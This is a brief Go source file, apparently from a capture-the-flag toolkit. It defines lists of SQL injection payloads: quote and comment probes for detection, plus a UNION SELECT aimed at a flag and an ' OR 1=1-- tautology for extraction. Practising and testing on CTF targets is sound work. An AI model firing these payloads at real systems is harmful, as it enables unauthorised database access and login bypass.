package sqli
// Detection and extraction payloads (CTF-safe, minimal)
var DetectPayloads = []string{
"'",
"\"",
"'--",
"\")--",
}


// Flag-oriented payloads (try to surface flag directly)
// These assume a text-rendering response; keep minimal
var ExtractPayloads = []string{
"' UNION SELECT 'flag{'--",
"' OR 1=1--",
}